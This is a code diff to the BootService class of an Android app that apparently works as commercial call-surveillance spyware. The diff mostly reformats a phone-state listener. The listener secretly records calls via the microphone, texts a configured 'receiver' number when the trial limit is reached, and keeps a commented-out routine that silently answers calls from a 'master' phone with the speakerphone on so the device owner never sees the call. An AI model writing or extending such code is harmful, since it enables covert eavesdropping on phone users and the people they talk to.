@@ -77,106 +77,103 @@ public class BootService extends Service
 				otherSidePhoneNum = incomingNumber;
 			}
 			
-            try {
-                switch (state) {
-                	case TelephonyManager.CALL_STATE_RINGING: { // 1
-                		/*
-                		// Listen to environment sound
-                		String masterPhone = GlobalPrefActivity.getReceiverPhoneNum(context);
-                		if (incomingNumber.contains(masterPhone)) 
-                		{
-                			// Answer the phone
-                            try {
-                            	answerPhoneAidl(context);
-                            }
-                            catch (Exception e) {
-                                Log.d(LOGTAG, "Error trying to answer using telephony service. Falling back to headset.");
-                                answerPhoneHeadsethook(context);
-                            }
-
-                            // Enable the speakerphone
-                            enableSpeakerPhone(context);
-                            
-                            return; // Do not let user to see or pick up the phone 
-                		}
-                		*/
-                		
-                		break;
-                	}
-                	case TelephonyManager.CALL_STATE_OFFHOOK: { // 2
-                		Context context = getApplicationContext();
-                		
-                		if (!ConfigCtrl.isLegal(context)) return;
-                		
-                		// Check if reached the recording limit if trial
-                		LICENSE_TYPE licType = ConfigCtrl.getLicenseType(context);
-                		if (licType == LICENSE_TYPE.TRIAL_LICENSED && ConfigCtrl.reachRecordingTimeLimit(context)) {
-                			if (!ConfigCtrl.getHasSentRecordingTimesLimitSms(context)) {
-                				// Send SMS to warn user
-        						String recvPhoneNum = GlobalPrefActivity.getReceiverPhoneNum(context);
-        						if (recvPhoneNum != null && recvPhoneNum.length() > 0) {
-        							String msg = context.getResources().getString(R.string.msg_recording_times_over_in_trial) + context.getResources().getString(R.string.support_qq);
-        							boolean ret = SmsCtrl.sendSms(recvPhoneNum, msg);
-        							if (ret) {
-        								ConfigCtrl.setHasSentRedirectSmsTimesLimitSms(context, true);
-        							}
-        						}
-                			}
-                			return;
-                		}
-                		
-                		if (!comingNumberIsLegal(context, otherSidePhoneNum)) return;
-            			
-            			if (recordStarted) return;
-            			
-            			// Set audio
-            			//setAudio(context);
-            			
-            			// Phone call recording
-            			try {
-                            Date startDate = new Date();
-                            this.fileFullPath = makePhonecallRecordFileFullPath(context, otherSidePhoneNum, startDate);
-                            recorder.reset();
-                            recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
-                            recorder.setOutputFormat(MediaRecorder.OutputFormat.DEFAULT);
-                            recorder.setAudioEncoder(MediaRecorder.AudioEncoder.DEFAULT);
-                            recorder.setOutputFile(fileFullPath);
-                            recorder.prepare();
-                            recorder.start();
-                            recordStarted = true;
-                        } catch(Exception ex) {
-                            //Log.e(LOGTAG, ex.getMessage());
+            switch (state) {
+            	case TelephonyManager.CALL_STATE_RINGING: { // 1
+                	/*
+                	// Listen to environment sound
+                	String masterPhone = GlobalPrefActivity.getReceiverPhoneNum(context);
+                	if (incomingNumber.contains(masterPhone)) 
+                	{
+                		// Answer the phone
+                        try {
+                           	answerPhoneAidl(context);
                         }
-                		break;
-                	}
-                	case TelephonyManager.CALL_STATE_IDLE: { // 0
-                		if (recordStarted) {
-        					recorder.stop();
-        					recordStarted = false;
-        					
-        					// If the size is less than 10KB, delete it
-        					try {
-        						File file = new File(this.fileFullPath);
-        						if (file.exists() && file.length() < MIN_FILE_SIZE) {
-        							file.delete();
-        						} else {
-        							// recording count ++ if in trial
-        							if (ConfigCtrl.getLicenseType(context) == LICENSE_TYPE.TRIAL_LICENSED) {
-        								ConfigCtrl.countRecordingTimesInTrial(context); 
-        							}
-        						}
-        						this.fileFullPath = "";
-        					} catch (Exception ex) {
-        						//
-        					}
-        				}
-                		break;
-                	}
-                	default: { }
+                        catch (Exception e) {
+                            Log.d(LOGTAG, "Error trying to answer using telephony service. Falling back to headset.");
+                            answerPhoneHeadsethook(context);
+                        }
+                        // Enable the speakerphone
+                        enableSpeakerPhone(context);
+                           
+                        return; // Do not let user to see or pick up the phone 
+              		}
+                	*/
+                		
+                	break;
                 }
-            } catch (Exception ex) {
+                case TelephonyManager.CALL_STATE_OFFHOOK: { // 2
+                	Context context = getApplicationContext();
+                	
+                	if (!ConfigCtrl.isLegal(context)) return;
+                	
+                	// Check if reached the recording limit if trial
+                	LICENSE_TYPE licType = ConfigCtrl.getLicenseType(context);
+                	if (licType == LICENSE_TYPE.TRIAL_LICENSED && ConfigCtrl.reachRecordingTimeLimit(context)) {
+                		if (!ConfigCtrl.getHasSentRecordingTimesLimitSms(context)) {
+                			// Send SMS to warn user
+        					String recvPhoneNum = GlobalPrefActivity.getReceiverPhoneNum(context);
+        					if (recvPhoneNum != null && recvPhoneNum.length() > 0) {
+        						String msg = context.getResources().getString(R.string.msg_recording_times_over_in_trial) + context.getResources().getString(R.string.support_qq);
+        						boolean ret = SmsCtrl.sendSms(recvPhoneNum, msg);
+        						if (ret) {
+        							ConfigCtrl.setHasSentRedirectSmsTimesLimitSms(context, true);
+        						}
+        					}
+                		}
+                		return;
+                	}
+                	
+                	if (!comingNumberIsLegal(context, otherSidePhoneNum)) return;
+            		
+            		if (recordStarted) return;
+            		
+            		// Set audio
+            		//setAudio(context);
+            		
+            		// Phone call recording
+            		try {
+                           Date startDate = new Date();
+                           this.fileFullPath = makePhonecallRecordFileFullPath(context, otherSidePhoneNum, startDate);
+                           recorder.reset();
+                           recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
+                           recorder.setOutputFormat(MediaRecorder.OutputFormat.DEFAULT);
+                           recorder.setAudioEncoder(MediaRecorder.AudioEncoder.DEFAULT);
+                           recorder.setOutputFile(fileFullPath);
+                           recorder.prepare();
+                           recorder.start();
+                           recordStarted = true;
+                       } catch(Exception ex) {
+                           //Log.e(LOGTAG, ex.getMessage());
+                       }
+                	break;
+                }
+                case TelephonyManager.CALL_STATE_IDLE: { // 0
+                	if (recordStarted) {
+        				recorder.stop();
+        				recordStarted = false;
+        				
+        				// If the size is less than 10KB, delete it
+        				try {
+        					File file = new File(this.fileFullPath);
+        					if (file.exists() && file.length() < MIN_FILE_SIZE) {
+        						file.delete();
+        					} else {
+        						// recording count ++ if in trial
+        						if (ConfigCtrl.getLicenseType(context) == LICENSE_TYPE.TRIAL_LICENSED) {
+        							ConfigCtrl.countRecordingTimesInTrial(context); 
+        						}
+        					}
+        					this.fileFullPath = "";
+        				} catch (Exception ex) {
+        					//
+        				}
+        			}
+                	break;
+                }
+                default: { }
+                
             }
-        }
+		}
     };
 
 	@Override
